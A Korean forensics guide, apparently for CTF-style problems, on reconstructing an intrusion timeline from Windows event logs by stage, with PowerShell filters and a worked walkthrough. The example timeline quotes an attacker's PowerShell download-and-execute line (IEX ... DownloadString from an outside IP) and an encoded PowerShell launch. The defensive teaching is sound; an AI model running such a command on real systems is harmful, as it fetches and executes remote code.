---
id: FOR-0108
title: "Event Log만으로 공격 타임라인 만들기: 침해 단계별 Event ID 지도"
slug: "attack-timeline-from-eventlog"
category: "Event Log"
type: "guide"
difficulty: "basic"
priority: "critical"
platform: [windows]
artifact: ["Security.evtx", "System.evtx", "PowerShell/Operational", "Sysmon/Operational", "TerminalServices", "EVTX"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs", "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "C:\\Windows\\System32\\winevt\\Logs\\System.evtx"]
registry_paths: []
event_ids: []
protocols: ["RDP", "SMB", "NTLM", "Kerberos"]
tools: ["EvtxECmd", "Timeline Explorer", "PowerShell", "sqlite3"]
commands: ["EvtxECmd.exe -d 'C:\\case\\winevt' --csv 'C:\\case\\out' --csvf all.csv --inc 4624,4688,7045,1102", "Import-Csv 'C:\\case\\out\\all.csv' | Group-Object EventId | Sort-Object Count -Descending"]
regex_patterns: []
wireshark_filters: []
tshark_fields: []
log_fields: ["TimeCreated", "EventId", "Channel", "TargetUserName", "TargetLogonId", "SubjectLogonId", "IpAddress", "NewProcessName", "CommandLine", "ServiceName", "ImagePath", "ScriptBlockText"]
file_formats: ["evtx", "csv"]
primary_terms: ["공격 타임라인", "이벤트 로그 타임라인", "침해 시나리오 재구성"]
keywords: ["공격 타임라인", "침해 단계", "kill chain", "초기 접근", "지속성", "권한 상승", "측면 이동", "반출", "흔적 제거", "Event ID 지도", "시나리오 재구성", "EVTX"]
aliases: ["공격 타임라인 만들기", "침해 흐름 정리", "이벤트로그로 사건 재구성", "무슨 일이 있었나", "공격 단계별 이벤트", "event id 지도"]
symptom_keywords: ["무슨 일이 일어났는지 시간순으로 써야 한다", "어떤 Event ID를 봐야 할지 모르겠다", "이벤트가 너무 많아 어디서 시작할지 모르겠다", "공격 단계를 못 나누겠다", "타임라인을 서술로 바꿔야 한다"]
related: ["FOR-0050", "FOR-0107", "FOR-0110"]
source_ids: ["SRC-022", "SRC-086", "SRC-021"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

Event Log만으로 공격 타임라인을 만들 때는 **최소 5종(4624·4625·4688·7045·1102)으로 시작해 얻은 값(계정·Logon ID·PID·IP)을 다음 단계의 필터로 쓰며 확장**하고, 침해 단계별 Event ID 지도표를 따라가면 "시간순 표 + 서술 문장" 형태의 답이 기계적으로 완성된다.

## 어떤 문제에서 필요한가

- "무슨 일이 일어났는지 시간순으로 서술하세요" — 답이 값 하나가 아니라 사건 흐름인 문제
- 첨부가 EVTX뿐이고 디스크 이미지가 없는 문제
- 공격 단계 중 하나(예: 지속성 수단)를 물어보는데, 어느 Event ID를 봐야 하는지 모르는 문제
- 이벤트가 수만~수십만 건이라 어디서 시작할지 정해야 하는 문제

디스크 artifact를 같은 축에 얹는 것은 [FOR-0050](./ntfs-artifact-timeline.html)의 몫이다. **이 글은 EVTX 안에서 끝까지 가는 방법**이고, 로그가 없는 구간을 디스크로 메우는 것은 FOR-0109로 넘긴다.

## 문제에서 처음 볼 단서

1. 첨부에 어느 채널이 있는가 — Security만이면 4624/4625/4688/1102, System이 있으면 7045가 추가된다
2. PowerShell/Operational이 있는가 → 4104가 사실상 정답 창고다
3. Sysmon 채널이 있는가 → 실행·네트워크·파일이 전부 잡힌다. 이 경우 Sysmon부터 본다
4. TerminalServices 채널이 있는가 → RDP 문제다. 1149와 21/24/25
5. 지문에 시각이 하나 주어졌는가 → 그 시각 ±10분으로 먼저 좁힌다. **KST인지 UTC인지 확인**

## 30초 절차

```powershell
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv --inc 4624,4688,7045,1102
```

이 네 개만으로 골격이 나온다. 그다음 이벤트 분포를 본다.

```powershell
Import-Csv 'C:\case\out\all.csv' |
  Group-Object Channel, EventId | Sort-Object Count -Descending |
  Select-Object -First 25 Name, Count | Format-Table -AutoSize
```

여기서 "있으면 안 되는 이벤트"를 먼저 찾는다.

```powershell
# 존재 자체가 사건인 이벤트들
Import-Csv 'C:\case\out\all.csv' |
  Where-Object { $_.EventId -in 1102,104,4719,1100,7045,4697,4720,4732,4698 } |
  Sort-Object { [datetime]$_.TimeCreated } |
  Format-Table TimeCreated, Channel, EventId, UserName, MapDescription -AutoSize
```

## 상세 절차

### 1단계 — 침해 단계별 Event ID 지도

이 표가 이 글의 본체다. 단계마다 **"무엇을 얻는가"** 열이 다음 단계의 필터가 된다.

| 단계 | Event ID | 채널 | 여기서 얻는 값 |
| --- | --- | --- | --- |
| **초기 접근** | 4625 (실패 로그온) | Security | 공격 시작 시각, 시도 계정 목록, 원본 IP |
| | 4624 (성공 로그온) | Security | 성공 계정, `TargetLogonId`, `LogonType`, IP |
| | 1149 (RDP 인증 성공) | TerminalServices-RemoteConnectionManager/Operational | `Param3` = 원본 주소 |
| | 4648 (명시적 자격증명) | Security | 발신 측 흔적, `TargetServerName` |
| **실행** | 4688 (프로세스 생성) | Security | `NewProcessName`, `CommandLine`, PID, `SubjectLogonId` |
| | 4104 (스크립트 블록) | PowerShell/Operational | **스크립트 본문 전체** (`ScriptBlockText`) |
| | 4103 (모듈/파이프라인) | PowerShell/Operational | `ContextInfo` 의 Host Application = 실행 명령행 |
| | Sysmon 1 (프로세스 생성) | Sysmon/Operational | `Image`, `CommandLine`, `ProcessGuid`, 해시 |
| **지속성** | 7045 (서비스 설치) | System | `ServiceName`, `ImagePath`, `AccountName` |
| | 4697 (서비스 설치) | Security | `ServiceName`, `ServiceFileName` |
| | 4698 (작업 등록) | Security | `TaskName`, `TaskContent`(XML 전체) |
| | Sysmon 13 (레지스트리 값 설정) | Sysmon/Operational | `TargetObject`, `Details` — Run 키 등 |
| | 4720 (계정 생성) | Security | 새 계정 이름, `TargetSid` |
| | 4732 (그룹 멤버 추가) | Security | `MemberSid`, 대상 그룹 이름 |
| **권한 상승** | 4672 (특수 권한 부여) | Security | `SubjectLogonId`, `PrivilegeList` |
| | 4673 (특권 서비스 호출) | Security | `PrivilegeList`, `ProcessName` |
| | 4674 (특권 객체 조작) | Security | `ObjectName`, `PrivilegeList` |
| **자격증명 접근** | 4672 with `SeDebugPrivilege` | Security | 메모리 접근 권한 획득 시점 |
| | 4776 (NTLM 검증) | Security | 계정, `Workstation`, `Status` |
| | 4768 / 4769 (Kerberos 티켓) | Security | `TargetUserName`, `ServiceName`, 암호화 타입 |
| **측면 이동** | 4624 `LogonType` = 3 | Security | 원격 접근 원본 IP |
| | 5140 / 5145 (공유 접근) | Security | `ShareName`, `RelativeTargetName` |
| | 4648 (명시적 자격증명) | Security | 다음 목적지(`TargetServerName`) |
| | 7045 (원격 서비스 설치) | System | 원격 실행 도구의 흔적 |
| **수집 / 반출** | 5145 (공유 파일 접근) | Security | 어떤 파일을 읽었나 |
| | Sysmon 3 (네트워크 연결) | Sysmon/Operational | `DestinationIp`, `DestinationPort`, `Image` |
| | Sysmon 11 (파일 생성) | Sysmon/Operational | `TargetFilename` — 압축 파일 생성 |
| **흔적 제거** | 1102 (감사 로그 지움) | Security | 지운 시각, 지운 계정 |
| | 104 (로그 파일 지움) | System | 어느 채널을 지웠나 |
| | 4719 (감사 정책 변경) | Security | 어떤 감사를 껐나 |
| | 1100 (로깅 서비스 종료) | Security | 로그가 끊긴 이유 |
| | Sysmon 23 (파일 삭제) | Sysmon/Operational | `TargetFilename`, 보관된 사본 |

### 2단계 — 최소 필요 이벤트로 시작한다

**처음부터 전부 보면 실패한다.** 다음 순서로 확장한다.

| 라운드 | 뽑는 이벤트 | 목적 | 이 라운드가 끝나면 |
| --- | --- | --- | --- |
| 1 | 4624, 4625, 4688, 7045, 1102 | 골격 | 공격 계정·IP·시작 시각·지속성 유무 |
| 2 | + 4672, 4634, 4648, 4720, 4732 | 권한과 계정 조작 | 권한 상승 시점, 만들어진 계정 |
| 3 | + 4104, 4103, Sysmon 1 | 실제 명령 | 무엇을 실행했나 |
| 4 | + 5140, 5145, Sysmon 3/11 | 수집·반출 | 어떤 파일이 어디로 |
| 5 | + 4698, Sysmon 13, 4697 | 지속성 상세 | 재부팅 후에도 살아남는 수단 |
| 6 | + 104, 4719, 1100, Sysmon 23 | 은폐 | 로그 공백의 원인 |

```powershell
# 라운드 1
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf r1.csv --inc 4624,4625,4688,7045,1102

# 라운드 3 (실행 상세)
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf r3.csv --inc 4104,4103,1
```

**gap 판정이나 "없음"을 근거로 쓸 때는 필터 없는 전체 CSV를 따로 뽑는다.** `--inc` CSV는 번호가 당연히 빈다.

### 3단계 — 값을 다음 단계 필터로 넘기는 흐름

이것이 pivot의 실체다. 한 단계에서 얻은 값이 다음 단계의 `Where-Object` 조건이 된다.

```text
4625 집계
  -> 시도 계정 목록, 원본 IP, 공격 시작 시각
       |
       v  (IP 로 필터)
4624 (같은 IP, 성공)
  -> TargetUserName, TargetLogonId, LogonType
       |
       v  (TargetLogonId 로 필터)
4672 / 4688 / 5145 (SubjectLogonId 일치)
  -> CommandLine, PID, 접근 파일
       |
       v  (PID / 프로세스 이름으로 필터)
4104 / Sysmon 1 / Sysmon 3
  -> 스크립트 본문, 통신 대상
       |
       v  (시각 창으로 필터)
7045 / 4698 / Sysmon 13
  -> 지속성 수단
       |
       v
1102 / 104 / 4719
  -> 은폐 시점 = 타임라인의 끝
```

```powershell
$csv = Import-Csv 'C:\case\out\all.csv'

# (1) 4625 집계 -> 공격 시작 시각과 IP
$csv | Where-Object { $_.EventId -eq 4625 } |
  ForEach-Object {
    $i = if ($_.Payload -match '"IpAddress":\s*"([^"]*)"') { $Matches[1] } else { '' }
    $u = if ($_.Payload -match '"TargetUserName":\s*"([^"]*)"') { $Matches[1] } else { '' }
    [pscustomobject]@{ Ip = $i; User = $u; TimeUTC = $_.TimeCreated }
  } | Group-Object Ip | Sort-Object Count -Descending |
  ForEach-Object {
    $g = $_.Group | Sort-Object TimeUTC
    [pscustomobject]@{
      Ip = $_.Name; Fails = $_.Count
      First = $g[0].TimeUTC; Last = $g[-1].TimeUTC
      Users = (($g.User | Sort-Object -Unique) -join ',')
    }
  } | Format-Table -AutoSize

# (2) 그 IP 의 성공 로그온 -> Logon ID
$ip = '203.0.113.77'
$csv | Where-Object { $_.EventId -eq 4624 -and $_.Payload -match [regex]::Escape($ip) } |
  Select-Object TimeCreated, EventRecordId, Payload | Format-List

# (3) 그 Logon ID 의 활동
$lid = '0x1a2b3c'
$csv | Where-Object { $_.Payload -match $lid } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
  Format-Table TimeCreated, Channel, EventId, MapDescription -AutoSize
```

각 단계의 상세 조인 절차는 세션은 FOR-0104, PID는 FOR-0105, IP/계정/단말은 FOR-0106에 있다.

### 4단계 — 노이즈 제거

| 버릴 대상 | 조건 |
| --- | --- |
| 컴퓨터 계정 | `TargetUserName` 이 `$` 로 끝난다 |
| 시스템 세션 | Logon ID `0x3e7` / `0x3e5` / `0x3e4` |
| 서비스·배치 로그온 | `LogonType` 4 / 5 (별도로 볼 때만 본다) |
| `UMFD-*`, `DWM-*` | 데스크톱 관리자 세션 |
| 정상 상주 프로세스 | `svchost.exe`, `taskhostw.exe` 등의 4688 (단, **경로가 정상인 것만**) |
| 반복 감사 노이즈 | 5379(자격증명 관리자 읽기), 4798(로컬 그룹 열거) 등 |

```powershell
$clean = $csv | Where-Object {
  $_.Payload -notmatch '"TargetUserName":\s*"[^"]*\$"' -and
  $_.Payload -notmatch '0x3e7|0x3e5|0x3e4' -and
  $_.UserName -notmatch '^UMFD-|^DWM-|ANONYMOUS'
}
'{0} -> {1} rows' -f $csv.Count, $clean.Count
```

노이즈 제거로 보통 **10분의 1 이하**로 줄어든다. 줄지 않으면 필터가 payload 표기와 안 맞는 것이다.

### 5단계 — 단계별로 하나씩 확정

각 단계는 "찾았다"로 끝내지 않고 **확증 조건**을 만족해야 타임라인에 올린다.

| 단계 | 최소 확증 조건 |
| --- | --- |
| 초기 접근 | 4625 누적 + 그 IP의 4624 성공. 실패 없이 성공만 있으면 "유효 자격증명 보유"로 서술 |
| 실행 | 4688의 `CommandLine` 또는 4104의 본문. 이름만으로는 부족 |
| 권한 상승 | 4672의 `PrivilegeList` 에 `SeDebugPrivilege`/`SeTakeOwnershipPrivilege` 등이 실제로 있는지 |
| 지속성 | 7045/4697의 `ImagePath`/`ServiceFileName` 이 비정상 경로 또는 인라인 명령 |
| 측면 이동 | 출발 호스트의 4648 또는 목적지의 4624 Type 3 + 같은 계정 |
| 반출 | Sysmon 3의 외부 `DestinationIp` 또는 5145의 대량 파일 접근 |
| 흔적 제거 | 1102/104의 시각 + 그 이후 로그 공백의 대비 |

### 6단계 — 결과를 시간순 표로 정리

제출 형식은 **표 + 서술 문장** 두 벌이다. 표만 내면 "그래서 무슨 일이 있었나"가 안 보이고, 문장만 내면 근거가 안 보인다.

표 템플릿:

```text
| 시각(KST) | 시각(UTC) | 단계 | Event ID | 채널 | 계정 | 내용 | 근거(RecordId) |
```

```powershell
# 확정된 이벤트만 골라 표로 내보낸다
$picked = @(1184402,1184571,1184572,1184573,1184574,1184880,1185004,1185204)

$csv | Where-Object { [int64]$_.EventRecordId -in $picked } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
  Select-Object @{n='KST';e={ ([datetime]$_.TimeCreated).AddHours(9).ToString('yyyy-MM-dd HH:mm:ss') }},
                @{n='UTC';e={ $_.TimeCreated }},
                Channel, EventId,
                @{n='RecId';e={ $_.EventRecordId }},
                UserName, MapDescription |
  Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\attack_timeline.csv'
```

완성 예시:

```text
| 시각(KST)            | UTC        | 단계      | ID   | 채널      | 계정       | 내용                          | RecId   |
| 2026-03-14 16:11:02 | 07:11:02Z  | 초기접근  | 4625 | Security  | svc_backup | 실패 214건 시작 (203.0.113.77) | 1184188 |
| 2026-03-14 16:19:02 | 07:19:02Z  | 초기접근  | 4624 | Security  | svc_backup | RDP 성공 Type 10, 0x1a2b3c    | 1184571 |
| 2026-03-14 16:19:02 | 07:19:02Z  | 권한상승  | 4672 | Security  | svc_backup | SeDebugPrivilege 포함         | 1184572 |
| 2026-03-14 16:20:08 | 07:20:08Z  | 실행      | 4688 | Security  | svc_backup | powershell.exe -enc ...       | 1184574 |
| 2026-03-14 16:20:09 | 07:20:09Z  | 실행      | 4104 | PowerShell| svc_backup | DownloadString(http://.../a.ps1) | 1188  |
| 2026-03-14 16:28:33 | 07:28:33Z  | 지속성    | 7045 | System    | svc_backup | WinUpdateSvc, ImagePath 비정상 | 8842   |
| 2026-03-14 16:31:44 | 07:31:44Z  | 수집      | 5145 | Security  | svc_backup | C$ Users\Public\out.7z        | 1184880 |
| 2026-03-14 16:45:11 | 07:45:11Z  | 흔적제거  | 1102 | Security  | svc_backup | 감사 로그 지움 (마지막 레코드) | 1185204 |
```

서술 템플릿:

```text
2026-03-14 16:11 KST 부터 203.0.113.77 에서 svc_backup 계정에 대한
로그온 실패가 214건 누적되었고(4625), 16:19:02 에 Logon Type 10(RDP)으로
성공했다(4624, RecId 1184571, LogonId 0x1a2b3c).
같은 초에 4672 가 기록되어 SeDebugPrivilege 를 포함한 특수 권한이
그 세션에 부여되었다(RecId 1184572).

16:20:08 에 같은 세션에서 powershell.exe 가 인코딩된 명령으로 실행되었고
(4688, RecId 1184574), 1초 뒤 PowerShell/Operational 4104 에
http://203.0.113.77/a.ps1 을 받아 실행하는 본문이 남았다.

16:28:33 에 WinUpdateSvc 라는 서비스가 설치되어(7045) 지속성이 확보되었다.
16:31:44 에 C$ 공유를 통해 Users\Public\out.7z 가 접근되었다(5145).
16:45:11 에 감사 로그가 지워졌고(1102, RecId 1185204) 이 레코드가
Security 채널의 마지막 레코드이므로, 그 이후 구간은 관측되지 않는다.
```

**문장마다 Event ID와 `RecordId` 를 붙인다.** 이것이 있으면 채점자가 검증할 수 있고, 자기 검산도 된다.

### 7단계 — 시간대 처리

**EVTX `System/TimeCreated/@SystemTime` 은 UTC다.** EvtxECmd CSV도 UTC로 출력하고, Event Viewer만 로컬 시간대로 변환해 보여준다.

```text
KST = UTC + 9시간
```

- 축은 UTC 하나로 고정한다
- 지문의 시각이 KST면 **−9시간해서 UTC로 바꿔 필터**한다
- 답을 낼 때만 +9시간해서 KST를 병기한다

```powershell
# 지문의 "KST 16:00~17:00" 구간 = UTC 07:00~08:00
$csv | Where-Object {
  ([datetime]$_.TimeCreated) -ge [datetime]'2026-03-14T07:00:00Z' -and
  ([datetime]$_.TimeCreated) -le [datetime]'2026-03-14T08:00:00Z'
}
```

## 출력 필드 해석

| 단계 | 결정적 필드 | 왜 결정적인가 |
| --- | --- | --- |
| 초기 접근 | 4625 `Status`/`SubStatus`, `IpAddress` | 계정 없음 vs 비밀번호 오류를 구분해 공격 방식을 판정 |
| 초기 접근 | 4624 `LogonType`, `TargetLogonId` | 접속 방식과 이후 모든 조인의 키 |
| 실행 | 4688 `CommandLine` | 인자 없이는 무엇을 했는지 알 수 없다 |
| 실행 | 4104 `ScriptBlockText` | 난독화된 명령의 본문 |
| 실행 | 4103 `ContextInfo` | `CommandLine` 이 비었을 때의 우회 경로 |
| 지속성 | 7045 `ImagePath` | `cmd /c`, `powershell -enc` 가 들어 있으면 확정적 악성 |
| 지속성 | 4698 `TaskContent` | 작업 XML 전체 — 실행 명령과 트리거가 그대로 |
| 권한 상승 | 4672 `PrivilegeList` | `SeDebugPrivilege` 는 메모리 접근 준비 신호 |
| 측면 이동 | 4648 `TargetServerName` | **발신 측** 기록이므로 경로의 방향을 정한다 |
| 반출 | Sysmon 3 `DestinationIp`/`DestinationPort` | 실제 통신 대상 |
| 흔적 제거 | 1102 `SubjectUserName` | 지운 계정 = 공격자 세션과 대조 |

## pivot: 다음에 볼 artifact

| 여기서 얻은 것 | 다음 목표 | 무엇을 확인하나 |
| --- | --- | --- |
| 공격 시작 시각 | `$MFT` / `$J` ([FOR-0050](./ntfs-artifact-timeline.html)) | 그 시각의 파일 생성·삭제 |
| `CommandLine` 이 비어 있음 | 4103 `ContextInfo`, Sysmon 1 | 명령행 우회 확보 |
| 7045 `ImagePath` 의 경로 | `$MFT` 그 파일의 생성 시각 | 언제 심어졌나 |
| 4104의 Base64 | 디코딩 → URL/IP | 통신 대상 |
| 반출 대상 IP | pcap ([FOR-0146](./wireshark-30sec-triage.html)) | 실제 전송량과 내용 |
| 1102 시각 이후 공백 | 다른 채널·디스크 artifact (FOR-0109) | 지워진 구간을 메운다 |
| 4720으로 만든 계정 | SAM hive, ProfileList | 계정 생성 시각과 프로필 |
| 로그온 세션 | UserAssist / Prefetch ([FOR-0061](./userassist.html)) | GUI 실행 흔적 |

## 흔한 함정

- **전체 이벤트를 한 번에 보려는 것.** 수만~수십만 건이다. → 라운드 1의 5종으로 골격을 먼저 만든다.
- **이벤트가 없는 것을 "일어나지 않았다"로 읽는 것.** 4688·4104·5145는 기본으로 꺼져 있는 경우가 많다. → 없음의 해석은 FOR-0109 절차를 따른다.
- **1102를 타임라인의 끝으로만 보고 넘기는 것.** 1102가 마지막 레코드라면 그 이후 구간이 통째로 소실됐다는 뜻이다. → 소실 구간의 길이를 계산해 서술에 넣는다.
- **같은 초 순서를 시각으로 정하는 것.** 4624와 4672가 같은 초에 있으면 인과가 뒤집혀 보인다. → 채널 안에서 `EventRecordId` 로 정렬한다 (FOR-0103).
- **채널이 다른 두 이벤트를 `EventRecordId` 로 비교하는 것.** 번호는 채널별 독립이다. → 시각과 인과로 정한다.
- **KST 지문을 UTC 필터에 그대로 넣는 것.** 9시간 어긋난 구간을 뒤진다. → 지문 KST − 9시간 = 필터할 UTC.
- **`LogonType` 3을 무조건 측면 이동으로 읽는 것.** 그룹 정책 적용·파일 공유 등 정상 트래픽이 대부분이다. → 계정·IP의 정상 기준선과 비교한다.
- **4672를 무조건 권한 상승으로 읽는 것.** 관리자 계정이 로그온하면 정상적으로 발생한다. → `PrivilegeList` 의 내용과 계정의 정상 패턴을 본다.
- **7045만 보고 지속성을 확정하는 것.** 정상 소프트웨어 설치도 7045를 남긴다. → `ImagePath` 가 비정상 경로인지, 인라인 명령인지 본다.
- **표만 제출하는 것.** 채점자는 "무슨 일이 있었나"를 읽고 싶어한다. → 표 + 서술 문장 두 벌을 낸다.
- **근거 없이 서술하는 것.** 문장에 Event ID와 `RecordId` 가 없으면 검증 불가다. → 모든 문장에 근거를 붙인다.
- **한 단계를 못 찾으면 멈추는 것.** 지속성이 없는 공격도 있고, 로그가 지워져 안 보일 수도 있다. → "관측되지 않음"과 "일어나지 않음"을 구분해 서술한다.

## 교차검증

```powershell
# 1) 4625 폭주 구간과 4624 성공 시각이 이어지는가
$csv | Where-Object { $_.EventId -in 4625,4624 } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
  Select-Object TimeCreated, EventId, UserName | Format-Table -AutoSize

# 2) 4688 의 실행과 4104 의 본문이 같은 시각대인가
$csv | Where-Object { $_.EventId -eq 4688 -and $_.Payload -match 'powershell' } |
  Select-Object TimeCreated, EventRecordId
$csv | Where-Object { $_.EventId -eq 4104 } |
  Select-Object TimeCreated, EventRecordId

# 3) 7045 의 서비스가 이후 실제로 실행됐는가 (4624 Type 5 또는 4688)
$csv | Where-Object { $_.EventId -eq 7045 } | Select-Object TimeCreated, Payload | Format-List
$csv | Where-Object { $_.Payload -match '"LogonType":\s*"?5' } | Select-Object TimeCreated, UserName

# 4) 1102 이후 그 채널에 이벤트가 남아 있는가
$csv | Where-Object { $_.Channel -eq 'Security' } |
  Sort-Object { [int64]$_.EventRecordId } | Select-Object -Last 3 EventRecordId, TimeCreated, EventId

# 5) 감사 정책이 중간에 바뀌었는가
$csv | Where-Object { $_.EventId -in 4719,1100,104 } |
  Select-Object TimeCreated, Channel, EventId, UserName, MapDescription
```

4번에서 1102가 마지막 레코드면 은폐가 성공한 것이고, 1102 뒤에도 이벤트가 있으면 **지워진 것은 그 이전 구간**이다. 이 구분이 서술을 바꾼다.

## mini walkthrough

```text
문제:
"이 호스트에서 일어난 침해를 시간순으로 서술하고,
 공격자가 심은 지속성 수단의 이름을 flag 로 제출하세요.
 지문: '침해는 2026-03-14 오후(KST)에 일어났습니다.'
 첨부: winevt/ (Security, System, PowerShell/Operational, Sysmon)"

1. 라운드 1
   EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
   -> 1,384,902 행 (Sysmon 이 대부분)

2. 첫 시도 (실패):
   지문의 "오후"를 그대로 믿고 13:00~18:00 으로 필터했다.

   $csv | Where-Object {
     ([datetime]$_.TimeCreated) -ge [datetime]'2026-03-14T13:00:00' -and
     ([datetime]$_.TimeCreated) -le [datetime]'2026-03-14T18:00:00'
   }
   -> 4,102 행. 그런데 4625 폭주도, 7045 도 하나도 안 보인다.

   무엇이 틀렸나:
     EVTX 의 시각은 UTC 다. 지문의 오후는 KST 다.
     KST 13:00~18:00 = UTC 04:00~09:00 이다.
     UTC 13~18시로 필터했으니 실제로는 KST 22시~다음날 03시를 보고 있었다.

   => 필터 구간을 UTC 04:00~09:00 으로 고쳤다.

3. 골격 확보
   $csv | Where-Object { $_.EventId -in 4625,4624,4688,7045,1102 -and (UTC 04~09) }

   4625 : 07:11:02Z ~ 07:18:39Z 사이 214건, 전부 IpAddress=203.0.113.77,
          TargetUserName=svc_backup
   4624 : 07:19:02Z svc_backup Type 10 (RDP), LogonId 0x1a2b3c
   7045 : 07:28:33Z 존재
   1102 : 07:45:11Z 존재

   골격 완성. 초기 접근 = RDP 무차별 대입 성공.

4. 두 번째 시도 (실패):
   실행 단계를 4688 의 CommandLine 으로 보려 했다.

   $csv | Where-Object { $_.EventId -eq 4688 } |
     Select-Object TimeCreated, Payload | Format-List
   -> CommandLine 필드가 전부 비어 있다.

   "명령행 없이 실행됐다" 로 서술? 오답.

   무엇이 틀렸나:
     4688 의 CommandLine 은 별도 정책을 켜야 채워진다.
     이 호스트는 그 정책이 꺼져 있어 필드 자체가 비었다.
     "인자 없이 실행"이 아니라 "기록되지 않음"이다.

   우회:
     PowerShell/Operational 4103 의 ContextInfo -> Host Application 에
     전체 명령행이 남아 있다.
     4104 의 ScriptBlockText 에 스크립트 본문이 남아 있다.
     Sysmon 1 의 CommandLine 도 채워져 있다.

   -> 07:20:08Z powershell.exe -enc SQBFAFgA... (Sysmon 1)
      07:20:09Z 4104: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1')

5. 세 번째 시도 (실패):
   지속성 수단으로 7045 를 봤는데 그 구간에 7045 가 두 개 있었다.

   07:28:33Z  ServiceName=WinUpdateSvc   ImagePath=C:\Users\Public\svc.exe
   07:29:04Z  ServiceName=NVDisplayCont  ImagePath=C:\Program Files\NVIDIA...

   시각순으로 앞의 것을 골랐는데, 두 개가 같은 초가 아니라 순서는 맞았다.
   그런데 "정상 소프트웨어 설치일 수도 있다"는 확증을 하지 않고
   NVDisplayCont 를 flag 로 낼 위험이 있었다.

   확증 절차:
     - ImagePath 가 사용자 쓰기 가능 경로(C:\Users\Public)인가 -> WinUpdateSvc: 예
     - 그 파일이 사건 구간에 생성됐는가 -> Sysmon 11 에 07:27:51Z TargetFilename=C:\Users\Public\svc.exe
     - 설치한 세션이 공격자 세션인가 -> 같은 시각 4688/Sysmon 1 의 부모가 0x1a2b3c 세션
     - NVDisplayCont 의 ImagePath 는 C:\Program Files\NVIDIA... -> 정상 경로, 서명된 벤더 경로

   -> 지속성 수단은 WinUpdateSvc 로 확정.

6. 은폐 판정
   1102 : 07:45:11Z, RecordId 1185204
   Security 채널의 마지막 레코드 번호와 같다 -> 이후 구간 전부 소실.
   Sysmon 채널은 08:30 까지 계속 기록되어 있다.
   => Security 만 지운 것이다. 시스템이 꺼진 것이 아니다.

7. 최종 타임라인 (KST 병기)
   16:11:02 (07:11:02Z) 4625 x214  203.0.113.77 -> svc_backup 무차별 대입
   16:19:02 (07:19:02Z) 4624 Type 10 성공, LogonId 0x1a2b3c
   16:19:02 (07:19:02Z) 4672 SeDebugPrivilege 포함 특수 권한
   16:20:08 (07:20:08Z) Sysmon 1 powershell.exe -enc ...
   16:20:09 (07:20:09Z) 4104 DownloadString('http://203.0.113.77/a.ps1')
   16:27:51 (07:27:51Z) Sysmon 11 C:\Users\Public\svc.exe 생성
   16:28:33 (07:28:33Z) 7045 WinUpdateSvc 서비스 설치 (지속성)
   16:31:44 (07:31:44Z) 5145 C$ Users\Public\out.7z 접근
   16:45:11 (07:45:11Z) 1102 감사 로그 지움 (Security 마지막 레코드)

정답 flag: WinUpdateSvc
```

세 번의 교정이 이 글의 핵심이다. **① 지문의 KST를 UTC로 환산하지 않으면 존재하지 않는 구간을 뒤진다.** **② `CommandLine` 이 비어 있는 것은 "인자 없음"이 아니라 "기록 안 됨"이다** — 4103/4104/Sysmon 1로 우회한다. **③ 7045가 여러 개면 `ImagePath` 의 경로와 그 파일의 생성 흔적으로 정상/악성을 갈라야** 답이 확정된다.

## 막혔을 때 다음 체크

1. 지문의 시각이 KST인가 — 필터는 UTC(−9시간)로 환산했는가
2. 라운드 1의 5종(4624/4625/4688/7045/1102)으로 골격을 만들었는가
3. 노이즈(컴퓨터 계정, `0x3e7`)를 제거했는가
4. 4625 집계로 공격 시작 시각을 확정했는가
5. 4624의 `TargetLogonId` 로 세션 활동을 조인했는가 (FOR-0104)
6. `CommandLine` 이 비어 있으면 4103/4104/Sysmon 1로 우회했는가
7. 7045/4697의 `ImagePath` 가 정상 경로인지 확인했는가
8. 4698(작업 등록)과 Sysmon 13(Run 키)도 봤는가
9. 1102/104가 마지막 레코드인지 확인했는가
10. 다른 채널이 그 구간에 계속 기록되어 있는지 대비했는가
11. 같은 초 순서를 채널 내 `EventRecordId` 로 정렬했는가
12. 각 단계의 확증 조건을 만족했는가 (5단계 표)
13. 표와 서술 문장을 **둘 다** 만들었는가
14. 문장마다 Event ID와 `RecordId` 근거를 붙였는가
15. 관측되지 않은 단계를 "일어나지 않음"으로 쓰지 않았는가

## 출처

- SRC-022 — Microsoft Learn, 고급 보안 감사 정책 설정: 4624·4625·4634·4648·4672·4673·4674·4697·4698·4719·4720·4732·4776·4768·4769·5140·5145·1100·1102 의 정의와 각 감사 하위 범주, 어떤 하위 범주가 기본으로 비활성인지의 근거
- SRC-086 — MITRE ATT&CK Enterprise Techniques: 초기 접근·실행·지속성·권한 상승·자격증명 접근·측면 이동·수집/반출·방어 회피 단계 구분과 각 단계의 대표 기법
- SRC-021 — Microsoft Learn, Event 4688: `NewProcessName`, `CommandLine`, `SubjectLogonId` 필드와 명령행 기록이 별도 정책이라는 근거
- Sysmon 이벤트(1/3/11/13/23)의 필드 이름은 Sysmon 문서 기준이며, 설정 파일(config)에 따라 수집 여부가 달라진다. 실제 채널에서 존재를 확인한 뒤 인용할 것
- 7045(Service Control Manager)와 104(Eventlog)는 System 채널의 이벤트로, 각 공급자 문서의 정식 필드 이름은 실제 이벤트 XML에서 확인할 것
- 각 감사 하위 범주의 기본 활성/비활성 상태는 Windows 버전과 적용된 정책에 따라 다르므로, "기본으로 꺼져 있다"를 근거로 쓸 때는 4719(감사 정책 변경)와 대상 시스템의 실제 정책을 함께 확인할 것
